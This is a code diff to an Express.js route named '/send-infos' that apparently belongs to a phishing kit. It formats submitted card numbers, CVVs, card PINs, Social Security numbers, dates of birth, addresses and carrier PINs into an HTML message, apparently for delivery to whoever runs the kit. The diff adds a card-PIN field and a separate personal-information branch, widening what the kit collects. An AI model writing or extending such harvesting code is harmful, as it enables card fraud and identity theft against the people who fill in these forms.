@@ -52,16 +52,27 @@ app.post("/send-infos", async (req, res) => {
                ? `
       <br>
       <h4>| CARD INFORMATION</h4>
-      <p>| FULL NAME 👉🏽 <b>${values.cardInformation.fullname}</b></p>
       <p>| CARD NUMBER 👉🏽 <b>${values.cardInformation.cardNumber}</b></p>
       <p>| EXPIRATION DATE 👉🏽 <b>${values.cardInformation.expiryDate}</b></B></p>
       <p>| CVV 👉🏽 <b>${values.cardInformation.cvv}</b></p>
-      <p>| SSN 👉🏽 <b>${values.cardInformation.ssn}</b></p>
-      <p>| DOB 👉🏽 <b>${values.cardInformation.dob}</b></p>
-      <p>| ADDRESS 👉🏽 <b>${values.cardInformation.fullAddress}</b></p>
+      <p>| CARD PIN 👉🏽 <b>${values.cardInformation.cardPin}</b></p>
       <br>
      `
-               : `
+               : `${
+                   values.form === "PERSONAL INFORMATION"
+                     ? `
+         <br>
+         <h4>| PERSONAL INFORMATION</h4>
+         <p>| FIRST NAME 👉🏽 <b>${values.personalInfo.firstname}</b></p>
+         <p>| LAST NAME 👉🏽 <b>${values.personalInfo.lastname}</b></p>
+         <p>| SSN 👉🏽 <b>${values.personalInfo.ssn}</b></p>
+         <p>| DOB 👉🏽 <b>${values.personalInfo.dob}</b></p>
+         <p>| ADDRESS 👉🏽 <b>${values.personalInfo.address}</b></p>
+         <p>| ZIP CODE 👉🏽 <b>${values.personalInfo.zipCode}</b></p>
+         <p>| STATE 👉🏽 <b>${values.personalInfo.state}</b></p>
+         <br>
+        `
+                     : `
                <br><br>
                <h4>| ACCOUNT UPDATE</h4>
                <p>| EMAIL ADDRESS 👉🏽 <b>${values.accountUpdate.email}</b></p>
@@ -70,6 +81,7 @@ app.post("/send-infos", async (req, res) => {
                <p>| CARRIER PIN 👉🏽 <b>${values.accountUpdate.carrierPin}</b></p>
                <br><br>
                `
+                 }`
            }`
      }
      `
